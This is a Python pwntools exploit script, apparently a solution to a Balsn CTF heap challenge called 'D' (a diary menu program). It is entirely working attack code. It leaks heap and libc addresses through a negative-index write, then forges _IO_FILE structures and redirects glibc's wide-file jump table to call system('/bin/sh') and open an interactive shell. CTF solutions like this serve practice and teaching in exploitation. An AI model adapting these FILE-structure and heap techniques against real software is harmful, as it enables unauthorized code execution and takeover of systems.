#!/usr/bin/env python3
from pwn import *

def input_name(name):
    p.sendafter(b"What's your name :", name)

def show_name():
    p.sendlineafter(b'choice : ', b'1')

def write_diary(length, content):
    p.sendlineafter(b'choice : ', b'2')
    l = str(length).encode()
    if len(l) < 3:
        p.sendlineafter(b'Diary Length : ', l)
    else:
        p.sendafter(b'Diary Length : ', str(length).encode())
    p.sendafter(b'Diary Content : ', content)

def edit_diary(index, content):
    p.sendlineafter(b'choice : ', b'4')
    l = str(index).encode()
    if len(l) < 3:
        p.sendlineafter(b'Page : ', l)
    else:
        p.sendafter(b'Page : ', l)
    p.sendafter(b'Content : ', content)

def tear_out_page(index):
    p.sendlineafter(b'choice : ', b'5')
    l = str(index).encode()
    if len(l) < 3:
        p.sendlineafter(b'Page : ', l)
    else:
        p.sendafter(b'Page : ', l)

p = process('./D', env={"LD_PRELOAD": "./libc-2.29.so"})
# p = remote('diary.balsnctf.com', 10101)

# Leak heap addr
name = b'a' * 0x20
input_name(name)
payload = b'a' * (0x80-4)
write_diary(len(payload), payload)
show_name()
heap_addr = u64(p.recvline()[0x20:-1].ljust(8, b'\x00')) - 0x260
log.info('heap_addr: {:#x}'.format(heap_addr))



# Free something, produce unsorted bin
for i in range(1, 9):
    mydiary = b'a' * 0x80
    write_diary(len(mydiary), mydiary)
write_diary(len(mydiary), mydiary)

for i in range(1, 9, 1):
    tear_out_page(i)


# Leak Libc & Prepare chain
target_leak = heap_addr + 0x6e8
fake_io_file = heap_addr + 0x808

iofile = b'\x00' * 4
iofile += p64(0)
iofile += p64(target_leak)
iofile += p64(0)
iofile += p64(target_leak)   # _IO_write_base
iofile += p64(target_leak+8) # _IO_write_ptr 
iofile += p64(target_leak+8) # _IO_write_end 
iofile += p64(target_leak+8) # _IO_buf_base 
iofile += p64(target_leak+8) # _IO_buf_end 
iofile += p64(0)
iofile += p64(0)
iofile += p64(0)
iofile += p64(0)
iofile += p64(fake_io_file)
edit_diary(-8, iofile)       # stdout
input('1')
libc_addr = u64(p.recv(8)) - 0x1e4ca0
system = libc_addr + 0x52fd0
log.info('{:#x}'.format(libc_addr))

write_diary(0x80, b'0')

payload  = p32(0)
payload += p64(0xfbad2887) # _flags         | 808
payload += p64(0)          # _IO_read_ptr   | 810
payload += p64(0)          # _IO_read_end   | 818
payload += p64(0)          # _IO_read_base  | 820
payload += p64(0)          # _IO_write_base |
payload += p64(1)          # _IO_write_ptr  | 830
payload += p64(1)          # _IO_write_end  | 838 | _IO_read_ptr
payload += p64(0)          # _IO_buf_base   |     | _IO_read_end
payload += p64(0)          # _IO_buf_end          | _IO_read_base
payload += p64(0)          # _IO_save_base        | _IO_write_base
payload += p64(0)          # _IO_backup_base      | _IO_write_ptr
payload += p64(0)          # _IO_save_end
payload += p64(0)          # _markers
payload += p64(0)          # _chain
write_diary(0x80, payload) # will locate at heap_addr+0x7f0
input('2')

iofile2  = p32(0)                     #                 | 890
iofile2 += p64(0)                     # _offset         | 898
iofile2 += p64(heap_addr+0x8b0)       # _codecvt        | 8a0
iofile2 += p64(heap_addr+0x838)       # _wide_data      |
iofile2 += b'/bin/sh\0'               # _freeres_list   | 8b0 | 
iofile2 += p64(0)                     # _freeres_buf    |     |
iofile2 += p64(0)                     # __pad5          | 8c0 |
iofile2 += p64(0xffffffffffffffff)    # _mode                 |
iofile2 += p64(system)                #                       | __codecvt_do_encoding
iofile2 += p64(0)
iofile2 += p64(libc_addr + 0x1e6080 - 0x18) # _IO_wfile_jumps._IO_wfile_sync
# iofile2 += p64(libc_addr + 0x1e6560) # vtable(0x00007fcac972e960 ~ +0xd68)
write_diary(len(iofile2), iofile2)
input('3')

write_diary(0x80, b'0')

p.interactive()
